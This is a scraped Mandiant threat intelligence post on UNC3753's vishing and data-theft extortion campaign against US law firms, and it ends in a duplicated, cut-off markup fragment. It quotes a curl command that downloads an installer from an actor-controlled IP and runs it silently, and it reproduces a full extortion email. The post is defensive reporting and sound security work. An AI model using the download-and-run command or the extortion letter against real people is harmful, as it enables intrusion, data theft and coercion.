nRhiJb-ObfsIf nRhiJb-fmcmS-oXtfBe"><div class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-ibL1re"></div><div class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-II5mzb kWSSdd"><h5 class="cHE8Ub Qwf2Db-MnozTc Qwf2Db-MnozTc-OWXEXe-MnozTc-qWD73c">Mandiant </h5><p class="nRhiJb-qJTHM khCp7b"></p></div><div class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-II5mzb kWSSdd"><h5 class="cHE8Ub Qwf2Db-MnozTc nRhiJb-DbgRPb-wNfPc-ma6Yeb nRhiJb-DbgRPb-qWD73c-cGMI2b"><div class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-ibL1re dzoHJ"><div class="aLW4J" track-metadata-module="left rail"><h5 class="qZDXV Qwf2Db-MnozTc Qwf2Db-MnozTc-OWXEXe-MnozTc-wNfPc">Mandiant Services</h5><p class="nRhiJb-cHYyed Mrfygc nRhiJb-BP2Omd-ma6Yeb-KE6vqe nRhiJb-DbgRPb-R6PoUb-cGMI2b">Stop attacks, reduce risk, and advance your security.</p><a class="nRhiJb-LgbsSe  nRhiJb-LgbsSe-OWXEXe-CNusmb-o6Shpd " href="https://cloud.google.com/security/contact/mandiant-consulting?utm_source=cgc-blog&amp;utm_medium=blog&amp;utm_campaign=FY25-Q3-global-GCP33642-website-cs-dgcsm-mandiant-consulting" track-metadata-module="left rail"track-metadata-module_headline="mandiant services" track-name="contact mandiant"track-type="button"track-metadata-position="cta"track-metadata-eventdetail="cloud.google.com/security/contact/mandiant-consulting?utm_source=cgc-blog&amp;utm_medium=blog&amp;utm_campaign=FY25-Q3-global-GCP33642-website-cs-dgcsm-mandiant-consulting">Contact Mandiant </a></div></div><div class="OYL9D nRhiJb-kR0ZEf-OWXEXe-GV1x9e-OiUrBf" jsname="tx2NYc"><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><p>Written by: Chad Reams, Tufail Ahmed, Keith Knapp, Ashley Frazer, Tyler McLellan</p>
<hr></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><h3><span style="vertical-align:baseline">Introduction</span><strong style="vertical-align:baseline"> </strong></h3>
<p><span style="vertical-align:baseline">From January through May 2026, Mandiant identified a financially motivated data theft extortion campaign executed by the threat cluster UNC3753 (also tracked as "Luna Moth," “Chatty Spider,” and "Silent Ransom Group") targeting dozens of organizations across professional, legal, and financial services in the United States.</span></p>
<p><span style="vertical-align:baseline">UNC3753 leverages voice phishing (vishing) and social engineering deception techniques to achieve remote access into corporate environments. Using pretexts such as data migration or invoice related emails, the threat actors initiate phone conversations posing as IT support and convince targets to host screen-sharing sessions and download remote monitoring and management (RMM) utilities. Once inside the environment, the threat actors either directly conduct searches to locate and exfiltrate highly sensitive data, or manipulate the victim into executing these actions on their behalf. This data typically includes proprietary legal agreements, personally identifiable information (PII), and financial records for subsequent extortion demands.</span></p>
<p><span style="vertical-align:baseline">Notably, in instances possibly linked to UNC3753, threat actors have accessed victims' systems in person. </span><a href="https://www.ic3.gov/CSA/2026/260526.pdf" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">In these physical incidents</span></a><span style="vertical-align:baseline">, individuals posing as IT technicians entered corporate offices to attempt direct exfiltration of data from an endpoint using USB storage media. </span></p>
<p><span style="vertical-align:baseline">This blog post details the threat group's technical lifecycle across recent Mandiant Consulting incident response engagements, highlights tactics like physical office targeting, and provides actionable recommendations to safeguard endpoints and infrastructure.</span></p>
<h3><span style="vertical-align:baseline">Threat Detail</span></h3>
<p><span style="vertical-align:baseline">The UNC3753 campaign lifecycle reflects an optimized, fast-tempo operational model. In many Mandiant investigated incidents, the entire attack sequence—from initial target contact to data theft and extortion—occurred within a single business day. Recently, Mandiant observed data searches, staging, and theft initiated in under an hour. </span></p>
<p><span style="vertical-align:baseline">The threat group frequently initializes campaigns using benign, invoice-themed email lures sent from actor-controlled consumer email accounts. These messages contain no active links or malicious attachments. Instead, they typically contain a brief, generic message for example: “hello, here is the invcoie we talked about yesterday”. Google Threat Intelligence Group (GTIG) assesses that the primary purpose of these emails is to establish a pretext, raising the target's internal security concerns so they are more susceptible to follow-up voice calls.</span></p></div></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/seeking-counsel-fig1.max-1500x1500.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/seeking-counsel-fig1.max-1500x1500.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/seeking-counsel-fig1.max-1500x1500.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/seeking-counsel-fig1.max-1500x1500.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><p>Figure 1: UNC3753 attack lifecycle</p></div></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><h4><span style="vertical-align:baseline">Initial Access via IT Helpdesk Impersonation</span></h4>
<p><span style="vertical-align:baseline">The core of UNC3753's entry mechanism relies on targeted vishing. Mandiant has observed the group targeting personnel across all seniority levels, who are often publicly listed on the organization’s websites, to harvest phone numbers and email addresses. Acting as members of the organization's internal IT helpdesk or security team, threat actors place direct calls to these employees. </span></p>
<p><span style="vertical-align:baseline">The callers use a variety of verbal instructions to guide target behavior. Under the guise of addressing a security issue or aiding with a corporate data migration project, they build trust and direct the target to join a screen-sharing session.</span></p>
<h4><span style="vertical-align:baseline">Remote Screen Control and Legitimate Tool Abuse</span></h4>
<p><span style="vertical-align:baseline">Once the target is engaged, the threat actors bypass conventional automated boundary security and email filtering controls by instructing the user to download and execute screen-sharing applications. </span></p>
<h5><span style="vertical-align:baseline">Screen-Sharing Utilities</span></h5>
<p><span style="vertical-align:baseline">UNC3753 instructs targets to initiate remote desktop and support sessions using built-in or commercial services, including Zoom, Microsoft Terminal Services, Microsoft Teams, and Quick Assist. During a Teams-facilitated intrusion, the threat actor held five distinct calls with the same target over a three-day period.</span></p>
<h5><span style="vertical-align:baseline">Commercial RMM Agents</span></h5>
<p><span style="vertical-align:baseline">UNC3753 frequently attempts to establish more persistent access by social engineering targets into downloading AnyDesk, Bomgar, or Zoho Assist installers. In one engagement, the threat actor attempted to install a "SuperOps RMM agent" by convincing the target to download and execute a payload via a cURL command.</span></p>
<h5><span style="vertical-align:baseline">Message Delivery via Privnote</span></h5>
<p><span style="vertical-align:baseline">Threat actors consistently utilize </span><code style="vertical-align:baseline">privnote[.]com,</code><span style="vertical-align:baseline"> a web-based, self-destructing text utility, to transmit installation links and commands to targets. This evasion technique ensures that copy-paste vectors leave no permanent footprint on endpoint browsers or chat logs.</span></p>
<p><span style="vertical-align:baseline">Example cURL command staging string observed in UNC3753 remote sessions:</span></p></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><pre><code>curl -sL &quot;http://[actor-controlled-ip]/installer&quot; -o &quot;SuperOps.msi&quot; &amp;&amp; msiexec /i &quot;SuperOps.msi&quot; /quiet</code></pre></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><h4><span style="vertical-align:baseline">Infrastructure Pivoting and Local Staging</span></h4>
<p><span style="vertical-align:baseline">Intrusions have abused Bring Your Own Device (BYOD) remote environments to access internal enterprise assets. In separate Mandiant Consulting cases, UNC3753 established Zoom sessions directly on targets' personal BYOD endpoints. Using these compromised personal laptops, they accessed corporate virtual desktop infrastructure (VDI) using native client platforms, such as Windows 365 (</span><code style="vertical-align:baseline">Windows365.exe</code><span style="vertical-align:baseline">) or Citrix clients. </span></p>
<p><span style="vertical-align:baseline">Once VDI environment access is secured, the threat actors pivot to corporate file systems:</span></p>
<ol>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><span style="vertical-align:baseline">System Enumeration: The threat actors map local directories, enumerate active OneDrive folders, and crawl mapped network drives.</span></p>
</li>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><span style="vertical-align:baseline">Document Management Targeted Harvesting: Threat actors target specific legal and document storage repositories.</span></p>
</li>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><span style="vertical-align:baseline">Keyword Search and File Staging: Threat actors use specific keyword search functions within iManage to locate highly sensitive folders containing tax logs (Forms W-2, W-9, and 1099), audit files, corporate client agreements, and Social Security numbers (SSNs). Staged results are compiled and sorted within target-accessible subdirectories, primarily inside the user's Downloads folder or native Roaming profile path.</span></p>
</li>
</ol>
<h3><span style="vertical-align:baseline">Data Theft</span></h3>
<p><span style="vertical-align:baseline">UNC3753 exfiltrates the staged data using a variety of methods to bypass security controls. They frequently use portable versions of WinSCP or Rclone. In other instances, they simply log into a threat actor-controlled consumer file sharing account directly within the victim's web browser and batch upload the stolen files.</span></p>
<ul>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">Cloud Storage Staging: Threat actors instruct targets—or directly control their screens—to drag and drop staged folders into threat actor-controlled consumer file sharing accounts. In several intrusions, the exfiltration destination included folders explicitly renamed to mimic the victim organization's branding.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">FTP Utilities: When browser-based uploads are restricted by endpoint controls, threat actors download FTP and SFTP client binaries, primarily WinSCP, to exfiltrate bulk packages. In one incident, the threat group exfiltrated 1.7 gigabytes of data from a target's local OneDrive folder to a Google Drive account before pivoting to a VDI session and exfiltrating an additional 14.4 gigabytes using WinSCP. Google has taken action against this actor by disabling the Drive accounts and assets associated with this activity.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">Email Forwarding: The threat actors have also had victims stage files from internal iManage repositories and instructed them to send the files to threat actor-controlled consumer email addresses from the target's mailbox.</span></p>
</li>
</ul>
<h3><span style="vertical-align:baseline">Threat Actor Extortion Tactics</span></h3>
<p><span style="vertical-align:baseline">The threat cluster delivers unbranded extortion communications via email shortly after successfully stealing data, often within 30 minutes of exiting the target environment. </span></p>
<p><span style="vertical-align:baseline">These highly aggressive extortion letters give organizations a three-day deadline to respond and initiate ransom negotiations. If the victim organization is unresponsive, the threat actors declare they will call and email target employees and external clients directly to alert them of the data breach. The extortion letters explicitly emphasize that the leak will compromise client trust, invite substantial regulatory fines, and suggest that external clients sue the victim organization for data mishandling. Additionally, as part of a follow-on message the group has threatened to publish all exfiltrated archives on the LEAKEDDATA data leak site (DLS).</span></p>
<h4><span style="vertical-align:baseline">Sample Extortion Email</span></h4></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">

<p><code style="vertical-align:baseline">Subject: [Victim Name] has lost confidential data of their clients. Very Important!</code></p>
<p><code style="vertical-align:baseline">Hello,</code></p>
<p><code style="vertical-align:baseline">We have to inform you that we got access to the [Victim Name] corporation&#39;s database and took a very large dataset. We have been in your network for weeks in multiple systems , aiming for proprietary and confidential files, and were able to obtain what We were looking for as well as the data of many clients. &lt;mentions the general nature of the stolen documents&gt;. This is not a joke or a scam.</code></p>
<p><code style="vertical-align:baseline">This is a real problem that puts the existence of your firm in danger and to prove it We have attached screenshots that are confirming the possession of the files.</code></p>
<p><code style="vertical-align:baseline">Reply to Our email and We will show you the complete file tree and actual files.</code></p>
<p><code style="vertical-align:baseline">We are an elite group who's been in this business for a very long time, We have Our own website where We post the data and thousands of individuals follow Our work , and connections in different business social media. But, what's more important, is that We want to return your data peacefully and as soon as possible.</code></p>
<p><code style="vertical-align:baseline">We will guarantee you the complete database deletion from Our servers, video evidence of us deleting the files, privacy of our communication and Our security advice with an explanation of how We got into your network and how to fix the vulnerability that We found.</code></p>
<p><code style="vertical-align:baseline">In order for us to solve this problem you need to send us an email and start communicating with us. We hope to find a financial solution that will be acceptable for both parties.</code></p>
<p><code style="vertical-align:baseline">In case of ignorance or no agreement, We will notify your employees, partners and customers, after which We will publish your data. You will receive claims from individuals, and legal entities for information leakage and breach of contracts, your current deals will be terminated. Journalists and others will dig into your documents, finding inconsistencies or violations in them. Your organization will lose its reputation, shares will fall in price, and your organization will be forced to close.</code></p>
<p><code style="vertical-align:baseline">Let us remind you that your data can be used by many other hackers and criminals on the dark web as well as your competitors and enemies in case We leak the data.</code></p>
<p><code style="vertical-align:baseline">Law enforcement will not help you, We are out of their jurisdiction, and We already took all the critical data. They will only tell you not to communicate with us and be the first ones to fine you.</code></p>
<p><code style="vertical-align:baseline">As soon as you reach out, We will show you all the files that We obtained, so you can understand the seriousness of this problem and the necessity to proceed to the negotiations.</code></p>
<p><code style="vertical-align:baseline">Our communication will stay 100% private before and after the agreement. We can show the proof of it as well.</code></p>
<p><code style="vertical-align:baseline">All further communication can be done through this email address.</code></p>
<p><code style="vertical-align:baseline">Do not waste any time as it is ticking . Text us today, so We don't have to start calling your employees tomorrow. You will have 3 days to start communicating.</code></p>
<p><code style="vertical-align:baseline">Here We attached some screenshots confirming all the above. Respond to this email and We will send you the file tree.</code></p>

<p style="text-align:center"><span style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%">Figure 2: <span style="vertical-align:baseline">UNC3753 e</span><span style="vertical-align:baseline">xtortion note example</span></span></p></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><h3><span style="vertical-align:baseline">Data Leak Site</span></h3></div></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/seeking-counsel-fi3.max-1200x1200.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/seeking-counsel-fi3.max-1200x1200.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/seeking-counsel-fi3.max-1200x1200.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/seeking-counsel-fi3.max-1200x1200.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><p>Figure 3: LEAKEDDATA DLS (partially redacted; cropped)</p></div></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><h4><span style="vertical-align:baseline">Suspected UNC3753 Activity Involving Physical Access</span></h4>
<p><span style="vertical-align:baseline">While UNC3753 primarily relies on digital vectors, GTIG assesses that associated threat actors have also attempted direct data theft using physical, in person access. This escalating tactic is corroborated by a recent </span><a href="https://www.ic3.gov/CSA/2026/260526.pdf" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">FBI Cyber FLASH Alert</span></a><span style="vertical-align:baseline"> highlighting instances where Silent Ransom Group threat actors leveraged physical office access to exfiltrate corporate data via removable USB media.</span></p>
<p><span style="vertical-align:baseline">According to the FBI advisory, if remote social engineering attempts fail, actors will send an individual to a victim's physical location. The onsite threat actor will claim they need to image the device or create local backups to address a security issue. Once they gain access to the endpoint, they attempt to exfiltrate corporate data directly to an external drive.</span></p>
<p><span style="vertical-align:baseline">Although limited forensic evidence and the absence of a subsequent extortion attempt prevent formal attribution, GTIG assesses that these physical intrusions are likely associated with UNC3753 based on structural, timeline, and targeting overlaps.</span></p>
<h3><span style="vertical-align:baseline">Attribution</span></h3>
<p><span style="vertical-align:baseline">GTIG attributes this campaign and related social engineering operations to UNC3753 based on infrastructure overlaps, domain registrar tracking, victimology, and target staging directories. </span><span style="vertical-align:baseline">UNC3753 (aliases: "Luna Moth," “Chatty Spider,” and "Silent Ransom Group (SRG)") is a financially motivated threat cluster active since at least March 2022. UNC3753 has TTP overlaps with UNC2686, a threat cluster that conducted "Bazarcall" style campaigns dating to early 2021. UNC3753 deployed LOCKBIT.BLACK in 2022, but has since prioritized data theft extortion-only operations typically involving threats to post stolen files to the LEAKEDDATA DLS. The threat cluster relies heavily on Remote Monitoring and Management (RMM) tools, unlike UNC2686 which deployed BAZARLOADER variants as well as TRICKBOT, URSNIF, and SILENTNIGHT. Initially, UNC3753 used subscription-themed billing email lures (such as fake software renewal alerts), typically with PDF attachments containing phone numbers for actor-controlled call centers. Beginning around March 2025, the cluster shifted tactics to pose as internal corporate IT helpdesk staff.</span></p>
<h3><span style="vertical-align:baseline">Remediation and Hardening</span></h3>
<p><span style="vertical-align:baseline">To mitigate the risk of voice phishing, physical office intrusions, and unauthorized endpoint control, GTIG recommends that organizations implement the following mitigation controls:</span></p>
<h4><span style="vertical-align:baseline">User Education</span></h4>
<p><span style="vertical-align:baseline">Conduct user awareness training specifically tailored to UNC3753 tactics, techniques, and procedures.</span></p>
<h4><span style="vertical-align:baseline">Physical Access and Verification Policies</span></h4>
<p><span style="vertical-align:baseline">Implement rigid out-of-band identity verification controls for all external contractors, technical staff, and facilities visitors. Mandate the following physical controls:</span></p>
<ul>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">Require visitors to display official credentials and photo identification.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">Require front-desk staff to copy and log all physical visitor IDs before granting access.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">Verify the arrival of all technicians against pre-scheduled work orders directly with the verified parent organization or helpdesk dispatcher.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">Enforce a policy requiring physical technical service personnel to be escorted by a corporate supervisor at all times.</span></p>
</li>
</ul>
<h4><span style="vertical-align:baseline">Remote Access Conditional Access Controls</span></h4>
<p><span style="vertical-align:baseline">Implement remote access conditional access policies to ensure only corporate owned devices can authenticate to Virtual Desktop Instance (VDI) or Virtual Private Network (VPN) devices. This facilitates increased organizational control and visibility for potential Remote Monitoring and Management usage. </span></p>
<h4><span style="vertical-align:baseline">Enforce Strict RMM and Screen-Sharing Software Controls</span></h4>
<p><span style="vertical-align:baseline">Audit corporate environments to block the installation and execution of unauthorized remote monitoring, management, and support utilities. Enforce application control policies (e.g. Windows Defender Application Control or third-party endpoint protection tools) to restrict execution of non-approved binaries. Organizations may also consider restricting interactive screen-control features within authorized virtual meeting platforms like Zoom and Teams. </span></p>
<h4><span style="vertical-align:baseline">Endpoint Removable Media Hardening</span></h4>
<p><span style="vertical-align:baseline">To neutralize physical exfiltration vectors, disable read/write capabilities for all external USB mass storage devices. Enforce Group Policy Objects (GPOs) or MDM configurations to restrict:</span></p>
<ul>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">USB storage device installation.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">Removable media access.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">Optical media writes on all corporate endpoints and BYOD systems utilizing VDI entry.</span></p>
</li>
</ul>
<h4><span style="vertical-align:baseline">Network Monitoring and Egress Control</span></h4>
<p><span style="vertical-align:baseline">Monitor firewall logs, network flows, and endpoint execution logs for indicative exfiltration and staging actions. Specifically:</span></p>
<ul>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">Block or alert on outbound connections to unauthorized file-sharing APIs and emails.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">Ensure full session logging with bytes transferred is enabled within Firewall log configurations.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">Monitor SSH traffic (Port 22) from internal VDIs and endpoints for high-volume WinSCP and Rclone transfers.</span></p>
</li>
</ul>
<h4><span style="vertical-align:baseline">Application Log and Access Auditing</span></h4>
<p><span style="vertical-align:baseline">Review authentication and access metrics for critical document stores to identify bulk harvesting profiles.</span></p>
<ul>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">Configure real-time alerts in iManage, SharePoint, and corporate email directories for rapid file searches, search-term spikes, and mass file downloads.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">Implement multi-factor authentication (MFA) on business critical data repository applications, such as iManage. </span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">Implement strict BYOD authentication controls, requiring MFA step-up queries when accessing VDI nodes.</span></p>
</li>
</ul>
<h3><span style="vertical-align:baseline">Outlook and Implications</span></h3>
<p><span style="vertical-align:baseline">The targeting of US legal and professional services organizations by financially motivated actors is a persistent industry risk. Legal services firms represent high-value targets for extortion actors. They maintain concentrated repositories of extremely sensitive client transaction files, merger and acquisition plans, client trade secrets, and corporate regulatory reports. Threat groups recognize that legal entities are subject to heavy reputational and regulatory exposure and may be highly motivated to resolve extortion situations quietly to protect their professional standing.</span></p>
<p><span style="vertical-align:baseline">Threat actors recognize that targeting the human element—specifically using voice-guided social engineering—enables them to easily bypass robust technical perimeters, web security gateways, and MFA configurations. </span></p>
<p><span style="vertical-align:baseline">Finally, the integration of in-person, physical intrusions represents an escalation in threat capability. While log-based defenses and endpoint telemetry have matured, physical corporate boundaries are frequently protected only by administrative procedures. Organizations must transition to a unified security posture that treats physical facility access control and endpoint-based hardware policies as equal components of their defensive perimeter.</span></p>
<h3><span style="vertical-align:baseline">Data Leak Site (DLS)</span></h3>
<p><span style="vertical-align:baseline">UNC3753 utilizes the following web platform to disclose the identities of victims and their compromised data.</span></p>
<ul>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">hxxps[:]//business-data-leaks[.]com</span></p>
</li>
</ul>
<h3><span style="vertical-align:baseline">Phishing Domains</span></h3>
<p><span style="vertical-align:baseline">GTIG identified infrastructure registrations by suspected UNC3753 actors utilizing specific naming conventions, assessed as supporting their ongoing social engineering and vishing activities.</span></p>
<ul>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">&lt;organization&gt;-itdesk[.]com</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">&lt;organization&gt;-it[.]com</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">&lt;organization&gt;-helpdesk[.]com</span></p>
</li>
</ul>

<p><span style="vertical-align:baseline">Google SecOps customers have access to these broad category rules and more under the Mandiant Intel Emerging Threats rule pack. The activity discussed in the blog post is detected in Google SecOps under the rule names:</span></p>
<ul>
<li style="list-style-type:disc;vertical-align:baseline">

<h3><span style="vertical-align:baseline">MITRE ATT&amp;CK</span></h3></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><div align="left">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">

environments.\",\"image\":\"https://storage.googleapis.com/gweb-cloudblog-publish/images/03_ThreatIntelligenceWebsiteBannerIdeas_BA.max-2600x2600.png\",\"author\":[{\"@type\":\"Person\",\"name\":\"Mandiant Intelligence\"],\"timeRequired\":\"PT19M\"}\u003c/script\u003e"],["Seeking Counsel: Ongoing Targeted Campaign Against US Law Firms"],null,null,[[null,null,[null,[null,"\u003cp\u003eWritten by: Chad Reams, Tufail Ahmed, Keith Knapp, Ashley Frazer, Tyler McLellan\u003c/p\u003e\n\u003chr\u003e"]]],[null,null,[null,[null,"\u003ch3\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eIntroduction\u003c/span\u003e\u003cstrong style\u003d\"vertical-align:baseline\"\u003e \u003c/strong\u003e\u003c/h3\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eFrom January through May 2026, Mandiant identified a financially motivated data theft extortion campaign executed by the threat cluster UNC3753 (also tracked as \"Luna Moth,\" “Chatty Spider,” and \"Silent Ransom Group\") targeting dozens of organizations across professional, legal, and financial services in the United States.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eUNC3753 leverages voice phishing (vishing) and social engineering deception techniques to achieve remote access into corporate environments. Using pretexts such as data migration or invoice related emails, the threat actors initiate phone conversations posing as IT support and convince targets to host screen-sharing sessions and download remote monitoring and management (RMM) utilities. Once inside the environment, the threat actors either directly conduct searches to locate and exfiltrate highly sensitive data, or manipulate the victim into executing these actions on their behalf. This data typically includes proprietary legal agreements, personally identifiable information (PII), and financial records for subsequent extortion demands.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eNotably, in instances possibly linked to UNC3753, threat actors have accessed victims' systems in person. \u003c/span\u003e\u003ca href\u003d\"https://www.ic3.gov/CSA/2026/260526.pdf\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cspan style\u003d\"text-decoration:underline;vertical-align:baseline\"\u003eIn these physical incidents\u003c/span\u003e\u003c/a\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e, individuals posing as IT technicians entered corporate offices to attempt direct exfiltration of data from an endpoint using USB storage media. \u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eThis blog post details the threat group's technical lifecycle across recent Mandiant Consulting incident response engagements, highlights tactics like physical office targeting, and provides actionable recommendations to safeguard endpoints and infrastructure.\u003c/span\u003e\u003c/p\u003e\n\u003ch3\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eThreat Detail\u003c/span\u003e\u003c/h3\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eThe UNC3753 campaign lifecycle reflects an optimized, fast-tempo operational model. In many Mandiant investigated incidents, the entire attack sequence—from initial target contact to data theft and extortion—occurred within a single business day. Recently, Mandiant observed data searches, staging, and theft initiated in under an hour. \u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eThe threat group frequently initializes campaigns using benign, invoice-themed email lures sent from actor-controlled consumer email accounts. These messages contain no active links or malicious attachments. Instead, they typically contain a brief, generic message for example: “hello, here is the invcoie we talked about yesterday”. Google Threat Intelligence Group (GTIG) assesses that the primary purpose of these emails is to establish a pretext, raising the target's internal security concerns so they are more susceptible to follow-up voice calls.\u003c/span\u003e\u003c/p\u003e"]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eFigure 1: UNC3753 attack 